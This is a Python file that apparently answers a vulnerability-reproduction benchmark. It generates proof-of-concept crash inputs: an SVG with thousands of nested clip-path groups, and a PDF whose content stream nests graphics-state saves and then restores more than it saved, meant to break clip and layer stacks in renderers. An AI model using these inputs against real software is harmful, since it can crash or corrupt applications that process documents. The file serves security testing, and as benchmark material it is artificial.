import io
import os
import tarfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Try to detect project hints (optional; default to SVG PoC)
        project_hint = ""
        try:
            if os.path.isfile(src_path) and tarfile.is_tarfile(src_path):
                with tarfile.open(src_path, 'r:*') as tf:
                    names = tf.getnames()
                    for n in names[:5000]:
                        lower = n.lower()
                        if any(k in lower for k in ("skia", "svg", "resvg", "librsvg", "tiny-skia", "sksvg")):
                            project_hint = "svg"
                            break
                        if any(k in lower for k in ("pdfium", "poppler", "pdf", "mupdf")):
                            project_hint = "pdf"
                            break
        except Exception:
            pass

        # Prefer SVG-based PoC as default; it is widely used by multiple projects' fuzzers
        if project_hint != "pdf":
            return self._svg_clip_nesting_poc()
        # If a PDF project is detected, try a PDF stream that aggressively manipulates graphics state.
        # However, if this heuristic is wrong, fallback SVG PoC is still likely to be effective for many targets.
        pdf = self._pdf_clip_nesting_poc()
        if pdf:
            return pdf
        return self._svg_clip_nesting_poc()

    def _svg_clip_nesting_poc(self) -> bytes:
        # Construct an SVG with deeply nested groups each applying the same clip-path.
        # The intent is to stress the layer/clip stack by repeatedly pushing clip marks.
        N = 4096  # Deep enough to exceed typical stack limits for clip tracking without causing recursion stack overflow.

        # Common clip path definition
        clip_def = (
            "<defs>"
            "<clipPath id='c' clipPathUnits='userSpaceOnUse'>"
            "<rect x='0' y='0' width='512' height='512'/>"
            "</clipPath>"
            "</defs>"
        )

        # Construct nested <g clip-path="url(#c)"> ... </g> blocks
        # Use short tags to minimize overhead while maintaining structure.
        sio = io.StringIO()
        sio.write("<?xml version='1.0' encoding='UTF-8'?>")
        sio.write("<svg xmlns='http://www.w3.org/2000/svg' width='512' height='512' viewBox='0 0 512 512'>")
        sio.write(clip_def)

        # Wrap the content in a top-level group to establish baseline context
        sio.write("<g id='root'>")

        # Open nested groups with the same clip-path
        open_tag = "<g clip-path='url(#c)'>"
        close_tag = "</g>"
        for _ in range(N):
            sio.write(open_tag)

        # Add a simple drawable element to ensure rendering path is exercised
        # Use a rectangle spanning the canvas, with a fill to ensure the drawing ops are triggered.
        sio.write("<rect x='0' y='0' width='512' height='512' fill='#00FF00'/>")

        # Close all nested groups
        for _ in range(N):
            sio.write(close_tag)

        sio.write("</g>")  # Close root
        sio.write("</svg>")
        data = sio.getvalue()
        return data.encode('utf-8', errors='ignore')

    def _pdf_clip_nesting_poc(self) -> bytes:
        try:
            # Create a minimal but syntactically valid PDF that performs many graphics state saves/restores
            # and repeated clipping operations. This stresses the layer/clip stack without relying on recursion.
            #
            # PDF structure: Catalog -> Pages -> Page -> Contents stream with operators.
            # Content stream uses:
            #   q = save graphics state
            #   Q = restore graphics state
            #   W n = set clipping path (nonzero winding) without stroking or filling
            #   re = rectangle path
            #   n = end path (with clipping already applied by W)
            #
            # We will deliberately perform excessive nestings and imbalanced restores to trigger potential
            # nesting depth mishandling in vulnerable implementations.

            # Build content stream
            N = 6000  # Deep but avoid massive output size/time. Adjusted to stress depth.
            content = io.StringIO()
            # Begin with a baseline rectangle path to ensure we have a path to clip.
            # Then perform many 'q' and clip operations. After certain depth, attempt extra 'Q' to underflow.
            content.write("0 0 612 792 re W n\n")
            for _ in range(N):
                content.write("q\n")  # push state
                # Define a small rectangle and set clip
                content.write("10 10 100 100 re W n\n")
            # Now try mismatched restores to potentially underflow the layer/clip depth
            for _ in range(N + 100):
                content.write("Q\n")  # pop state too many times
            # Draw something after the excessive pops
            content.write("0 0 612 792 re n\n")

            content_stream = content.getvalue().encode('ascii', 'ignore')
            length = len(content_stream)

            # Build minimal PDF objects
            # Offsets will be computed for a simple xref
            objs = []
            def add_obj(obj_str):
                objs.append(obj_str)

            add_obj("1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")
            add_obj("2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")
            # Resources can be empty
            add_obj("3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << >> >>\nendobj\n")
            add_obj(f"4 0 obj\n<< /Length {length} >>\nstream\n".encode('ascii') + content_stream + b"\nendstream\nendobj\n")

            # Assemble PDF with xref
            header = b"%PDF-1.7\n%\xE2\xE3\xCF\xD3\n"
            body = bytearray()
            offsets = []
            pos = len(header)
            for o in objs:
                if isinstance(o, bytes):
                    s = o
                else:
                    s = o.encode('ascii', 'ignore')
                offsets.append(pos)
                body.extend(s)
                pos += len(s)

            xref_pos = len(header) + len(body)
            xref = io.StringIO()
            xref.write("xref\n")
            xref.write(f"0 {len(objs)+1}\n")
            xref.write("0000000000 65535 f \n")
            for off in offsets:
                xref.write(f"{off:010d} 00000 n \n")
            xref_str = xref.getvalue().encode('ascii', 'ignore')

            trailer = (
                f"trailer\n<< /Size {len(objs)+1} /Root 1 0 R >>\nstartxref\n{xref_pos}\n%%EOF\n"
            ).encode('ascii', 'ignore')

            pdf_bytes = header + bytes(body) + xref_str + trailer
            return pdf_bytes
        except Exception:
            return b""